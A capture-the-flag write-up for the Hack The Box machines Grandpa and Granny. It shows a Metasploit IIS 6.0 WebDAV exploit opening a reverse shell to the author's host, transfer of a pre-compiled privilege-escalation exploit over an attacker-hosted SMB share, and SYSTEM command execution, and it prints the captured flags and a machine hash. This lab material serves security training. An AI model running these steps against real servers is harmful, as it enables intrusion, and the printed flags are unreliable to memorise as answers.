# Grandpa/Granny

![](./images/grandpa.png)
![](./images/granny.png)

Please note that the exploitation process for both the granny and grandpa machines is pretty much identical.
This writeup will only cover the steps to gain SYSTEM level access on the grandpa machine, but you can reproduce the same steps to get the same SYSTEM level access on the granny machine.

#### Machine release date: April 12, 2017

## Active Ports

```bash
sudo nmap -p80 -sC -sV -oA nmap/full-tcp-version 10.10.10.14
```

```none
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 12:22 EDT
Nmap scan report for 10.10.10.14
Host is up (0.028s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods:
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan:
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Date: Thu, 03 Sep 2020 16:24:53 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Type: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Vulnerability Discovery

As seen in the nmap scan above, `Microsoft IIS httpd 6.0` is extremely outdated, so I went ahead and googled for some known exploits against it.
It turns out that [some research](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl) showed that the vulnerability disclosure date was shortly after this box was released.

The link above also let me know that there was a metasploit exploit module, so I figured I would give it a shot. 

## Exploitation

```none
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS         10.10.10.14      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.24      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86


msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit

[*] Started reverse TCP handler on 10.10.14.24:4444
[*] Trying path length 3 to 60 ...
[*] Sending stage (176195 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.14.24:4444 -> 10.10.10.14:1030) at 2020-09-03 13:05:12 -0400

meterpreter > sysinfo
Computer        : GRANPA
OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
```

## Privilege Escalation

At this point, I wanted to check to see if I was part of any interesting groups and/or had any interesting privileges I could abuse.

```none
meterpreter > shell
[-] Failed to spawn shell with thread impersonation. Retrying without it.
Process 2668 created.
Channel 2 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami /all
whoami /all

USER INFORMATION
----------------

User Name                    SID
============================ ========
nt authority\network service S-1-5-20


GROUP INFORMATION
-----------------

Group Name                       Type             SID                                            Attributes
================================ ================ ============================================== ==================================================
NT AUTHORITY\NETWORK SERVICE     User             S-1-5-20                                       Mandatory group, Enabled by default, Enabled group
Everyone                         Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
GRANPA\IIS_WPG                   Alias            S-1-5-21-1709780765-3897210020-3926566182-1005 Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Log Users    Alias            S-1-5-32-559                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                    Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE             Well-known group S-1-5-6                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization   Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
LOCAL                            Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                    Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

Being part of the `NT AUTHORITY\SERVICE` and `NT AUTHORITY\NETWORK SERVICE` groups in combination with the `SeImpersonatePrivilege` privilege is normally a recipe for privilege escalation to SYSTEM. I also checked operating system version:

```none
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 GRANPA
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 14 Minutes, 56 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 792 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,323 MB
Page File: In Use:         147 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A

```

`Windows Server 2003 SP2` is extremely outdated and there should be known privilege escalation exploits.

```none
$ searchsploit microsoft windows server 2003 | grep local
Microsoft Windows Server 2000 - 'RegEdit.exe' Registry Key Value Buffer Overflow                                                                          | windows/local/22528.c
Microsoft Windows Server 2000 - CreateFile API Named Pipe Privilege Escalation (1)                                                                        | windows/local/22882.c
Microsoft Windows Server 2000 - CreateFile API Named Pipe Privilege Escalation (2)                                                                        | windows/local/22883.c
Microsoft Windows Server 2000 - Help Facility '.CNT' File :Link Buffer Overflow                                                                           | windows/local/22354.c
Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation                                                                               | windows/local/6705.txt
Microsoft Windows Server 2003 SP2 - Local Privilege Escalation (MS14-070)                                                                                 | windows/local/35936.py
Microsoft Windows Server 2003 SP2 - TCP/IP IOCTL Privilege Escalation (MS14-070)                                                                          | windows/local/37755.c
```

I took a look at the `Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation` exploit which pointed me to an exploit known as `Churrasco`.
After doing some research on that, I tried compiling the exploit code on one of my local windows machines. Unfortunately, the exploit code was too outdated for my version of Visual Studio to compile it. After some more research, I stumbled upon pre-compiled windows kernel exploits in the following [GitHub repository](https://github.com/SecWiki/windows-kernel-exploits). I went ahead and downloaded the pre-compiled `pr.exe` [executable](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS09-012).

At this point, I needed to transfer the `pr.exe` exploit to the grandpa machine.

Meterpreter failed to upload the executable:

```none
meterpreter > upload /home/kali/htb/boxes/grandpa/privesc/pr.exe
[*] uploading  : /home/kali/htb/boxes/grandpa/privesc/pr.exe -> pr.exe
[-] core_channel_open: Operation failed: Access is denied.
```

NOTE: I later learned that this uploading problem could have been fixed by migrating the meterpreter session to a more stable process (facepalm).


Therefore, I ended up transferring the exploit via SMB instead:

```none
c:\windows\system32\inetsrv>net use x: \\10.10.14.24\r0kit
net use x: \\10.10.14.24\r0kit
The command completed successfully.

c:\windows\system32\inetsrv>mkdir c:\Windows\Temp\r0kit
c:\windows\system32\inetsrv> copy x:\pr.exe c:\Windows\Temp\r0kit
```


```none
$ sudo python3 ~/tools/impacket/examples/smbserver.py r0kit shared/
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.14,1058)
[*] AUTHENTICATE_MESSAGE (HTB\GRANPA$,GRANPA)
[*] User GRANPA\GRANPA$ authenticated successfully
[*] GRANPA$::HTB:6dabc0316e40693500000000000000000000000000000000:98338fd54b7c874aef05a162208e8dffb8b2b32fbf4e8c57:4141414141414141
[-] Unknown level for query path info! 0x109
eeel[*] Handle: The NETBIOS connection with the remote host timed out.
[*] Closing down connection (10.10.10.14,1058)
[*] Remaining connections []
```

I then verified that the exploit was capable of running commands with SYSTEM privileges:

```none
c:\windows\system32\inetsrv>c:\Windows\Temp\pr.exe "whoami"
c:\Windows\Temp\pr.exe "whoami"
/xxoo/-->Build&&Change By p
/xxoo/-->This exploit gives you a Local System shell
/xxoo/-->Got WMI process Pid: 1816
begin to try
/xxoo/-->Found token SYSTEM
/xxoo/-->Command:whoami
nt authority\system
```

I then searched the system for the `user.txt` and `root.txt` files with the following commands:

```none
cd c:\
"C:\WINDOWS\Temp\pr.exe" "dir user.txt* /s"
"C:\WINDOWS\Temp\pr.exe" "dir root.txt* /s"
```

From there, I was able to grab the `user.txt` flag:

```none
c:\windows\system32\inetsrv>c:\Windows\Temp\pr.exe "type \"C:\Documents and Settings\Harry\Desktop\user.txt\""
c:\Windows\Temp\pr.exe "type \"C:\Documents and Settings\Harry\Desktop\user.txt\""
/xxoo/-->Build&&Change By p
/xxoo/-->This exploit gives you a Local System shell
/xxoo/-->Got WMI process Pid: 2756
begin to try
/xxoo/-->Found token SYSTEM
/xxoo/-->Command:type "C:\Documents and Settings\Harry\Desktop\user.txt"
bdff5ec67c3cff017f2bedc146a5d869
```

And the `root.txt` flag:

```none
c:\windows\system32\inetsrv>c:\Windows\Temp\pr.exe "type \"C:\Documents and Settings\Administrator\Desktop\root.txt\""
c:\Windows\Temp\pr.exe "type \"C:\Documents and Settings\Administrator\Desktop\root.txt\""
/xxoo/-->Build&&Change By p
/xxoo/-->This exploit gives you a Local System shell
/xxoo/-->Got WMI process Pid: 2756
begin to try
/xxoo/-->Found token SYSTEM
/xxoo/-->Command:type "C:\Documents and Settings\Administrator\Desktop\root.txt"
9359e905a2c35f861f6a57cecf28bb7b
```

## Countermeasures

* Update to the latest version of Windows Server currently available.
* Update to the latest version of IIS currently available.
